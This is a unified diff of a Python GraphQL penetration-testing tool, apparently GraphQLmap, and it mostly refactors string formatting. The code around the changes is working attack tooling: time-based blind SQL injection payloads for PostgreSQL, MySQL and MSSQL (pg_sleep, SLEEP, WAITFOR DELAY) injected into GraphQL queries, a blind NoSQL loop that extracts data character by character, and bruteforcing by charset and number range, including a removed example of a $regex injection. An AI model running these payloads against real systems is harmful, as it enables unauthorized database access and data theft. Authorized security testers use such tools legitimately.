@@ -45,7 +45,11 @@ def dump_schema(url, method, graphversion, headers, use_json):
                     except Exception:
                         pass
 
-                    print("\t\033[92m{}\033[0m[\033[94m{}\033[0m]: ".format(fields['name'], field_type), end='')
+                    print(
+                        f"\t\033[92m{fields['name']}\033[0m[\033[94m{field_type}\033[0m]: ",
+                        end='',
+                    )
+
 
                     # add the field to the autocompleter
                     cmdlist.append(fields['name'])
@@ -64,7 +68,7 @@ def dump_schema(url, method, graphversion, headers, use_json):
                         except Exception:
                             pass
 
-                        print("{} (\033[93m{}\033[0m!), ".format(args_name, args_ttype), end='')
+                        print(f"{args_name} (\033[93m{args_ttype}\033[0m!), ", end='')
                         cmdlist.append(args_name)
 
                     print("")
@@ -76,30 +80,20 @@ def exec_graphql(url, method, query, headers=None, use_json=False, only_length=0
     r = requester(url, method, query, headers, use_json)
     try:
         graphql = r.json()
-        errors = graphql.get("errors")
-
-        # handle errors in JSON data
-        if errors:
+        if errors := graphql.get("errors"):
             return "\033[91m" + errors[0]['message'] + "\033[0m"
 
-        else:
-            try:
-                jq_data = jq(graphql)
+        try:
+            jq_data = jq(graphql)
 
                 # handle blind injection (content length)
-                if only_length:
-                    return len(jq_data)
-
-                # otherwise return the JSON content
-                else:
-                    return jq(graphql)
-
-            except:
-                # when the content isn't a valid JSON, return a text
-                return r.text
+            return len(jq_data) if only_length else jq(graphql)
+        except:
+            # when the content isn't a valid JSON, return a text
+            return r.text
 
     except Exception as e:
-        return "\033[91m[!]\033[0m {}".format(str(e))
+        return f"\033[91m[!]\033[0m {str(e)}"
 
 
 def exec_advanced(url, method, query, headers, use_json):
@@ -112,21 +106,23 @@ def exec_advanced(url, method, query, headers, use_json):
         for c in graphql_charset:
             length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), headers, use_json, only_length=1)
             print(
-                "[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))
+                f'[+] \033[92mQuery\033[0m: (\033[91m{length}\033[0m) {query.replace("GRAPHQL_CHARSET", c)}'
+            )
 
 
-    # Allow a user to bruteforce number from a specified range
-    # e.g: {doctors(options: 1, search: "{ \"email\":{ \"$regex\": \"Maxine3GRAPHQL_INCREMENT_10@yahoo.com\"} }"){id, lastName, email}}
+
     elif "GRAPHQL_INCREMENT_" in query:
         regex = re.compile("GRAPHQL_INCREMENT_(\d*)")
         match = regex.findall(query)
 
         for i in range(int(match[0])):
-            pattern = "GRAPHQL_INCREMENT_" + match[0]
+            pattern = f"GRAPHQL_INCREMENT_{match[0]}"
             length = exec_graphql(url, method, query.replace(pattern, str(i)), headers, use_json, only_length=1)
-            print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))
+            print(
+                f"[+] \033[92mQuery\033[0m: (\033[91m{length}\033[0m) {query.replace(pattern, str(i))}"
+            )
 
-    # Otherwise execute the query and display the JSON result
+
     else:
         print(exec_graphql(url, method, query, headers, use_json))
 
@@ -134,28 +130,43 @@ def exec_advanced(url, method, query, headers, use_json):
 def blind_postgresql(url, method, headers, use_json):
     query = input("Query > ")
     payload = "1 AND pg_sleep(30) --"
-    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    print(
+        f"\033[92m[+] Started at: {time.asctime(time.localtime(time.time()))}\033[0m"
+    )
+
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
     requester(url, method, injected, headers, use_json)
-    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    print(
+        f"\033[92m[+] Ended at: {time.asctime(time.localtime(time.time()))}\033[0m"
+    )
 
 
 def blind_mysql(url, method, headers, use_json):
     query = input("Query > ")
     payload = "'-SLEEP(30); #"
-    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    print(
+        f"\033[92m[+] Started at: {time.asctime(time.localtime(time.time()))}\033[0m"
+    )
+
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
     requester(url, method, injected, headers, use_json)
-    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    print(
+        f"\033[92m[+] Ended at: {time.asctime(time.localtime(time.time()))}\033[0m"
+    )
 
 
 def blind_mssql(url, method, headers, use_json):
     query = input("Query > ")
     payload = "'; WAITFOR DELAY '00:00:30';"
-    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    print(
+        f"\033[92m[+] Started at: {time.asctime(time.localtime(time.time()))}\033[0m"
+    )
+
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
     requester(url, method, injected, headers, use_json)
-    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    print(
+        f"\033[92m[+] Ended at: {time.asctime(time.localtime(time.time()))}\033[0m"
+    )
 
 
 def blind_nosql(url, method, headers, use_json):
@@ -169,8 +180,8 @@ def blind_nosql(url, method, headers, use_json):
         charset = "abcdefghijklmnopqrstuvwxyz1234567890"
     data = ""
     _break = False
-    
-    while (_break == False):
+
+    while not _break:
         old_data = data
         for c in charset:
             injected = query.replace("BLIND_PLACEHOLDER", data + c)
@@ -178,7 +189,7 @@ def blind_nosql(url, method, headers, use_json):
             if check in r.text:
                 data += c
                 # display data and update the current line
-                print("\r\033[92m[+] Data found:\033[0m {}".format(data), end='', flush=False)
+                print(f"\r\033[92m[+] Data found:\033[0m {data}", end='', flush=False)
         # Stop if no character is found
         if(old_data == data):  
             _break = True
